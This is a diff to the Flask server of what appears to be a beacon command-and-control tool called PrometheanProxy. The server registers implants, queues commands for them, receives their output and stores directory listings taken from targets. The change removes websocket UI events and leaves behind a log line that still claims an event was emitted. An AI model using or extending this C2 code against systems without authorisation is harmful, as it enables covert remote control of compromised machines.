@@ -5,18 +5,12 @@ import time
 import zlib
 import json
 
-from flask_socketio import SocketIO
 from Modules.global_objects import (
     beacon_list, command_list, config, logger)
 from Server.Modules.beacon.beacon import add_beacon_list, remove_beacon_list
 
 # --- Flask App Initialization ---
 beaconControl = Flask(__name__)
-socketio = SocketIO(
-    beaconControl,
-    cors_allowed_origins="*",
-    async_mode="threading"
-)
 
 
 def _process_request_data(raw_data):
@@ -81,14 +75,7 @@ def connection_request(part1, part2, ad_param, version):
         )
         logger.debug(f"Beacon list updated for userID: {userID}")
 
-        socketio.emit('new_connection', {
-            'uuid': userID,
-            'name': data['name'],
-            'os': data['os'],
-            'address': data['address'],
-            "interval": config['beacon']["interval"],
-            "jitter": config['beacon']['jitter']
-        })
+      
         logger.info(f"Emitted 'new_connection' event via websockets for UUID: {userID}")
 
         return jsonify({
@@ -156,12 +143,6 @@ def beacon_call_in(part1, part2):
     beacon.next_beacon = time.asctime(time.localtime(next_beacon_time))
     logger.info(f"Beacon {beacon_id} updated. Next check-in: {beacon.next_beacon}")
 
-    socketio.emit('countdown_update', {
-        'uuid': beacon_id,
-        'timer': beacon.timer,
-        'jitter': beacon.jitter,
-    })
-
     # Check for commands to send
     commands_to_send = []
     for cmd_id, command in command_list.items():
@@ -206,11 +187,9 @@ def response(path1, version):
         return '', 500  # Internal server error, as we expected this command
 
     command.command_output = output
-    socketio_event = 'command_response'
 
     # Special handling for directory traversal
     if command.command == "directory_traversal":
-        socketio_event = "directory_traversal"
         logger.info(f"Directory Traversal response for beacon {command.beacon_uuid}. Saving to file.")
 
         dir_path = os.path.expanduser(f"~/.PrometheanProxy/{command.beacon_uuid}")
@@ -225,13 +204,6 @@ def response(path1, version):
         logger.debug(f"Removing beacon {command.beacon_uuid} from the list.")
         remove_beacon_list(command.beacon_uuid)
 
-    # Emit update to the UI
-    socketio.emit(socketio_event, {
-        'uuid': command.beacon_uuid,
-        'command_id': command.command_uuid,
-        'command': command.command,
-        'response': output
-    })
-    logger.info(f"Emitted '{socketio_event}' event for command {cid}.")
+  
 
     return '', 200
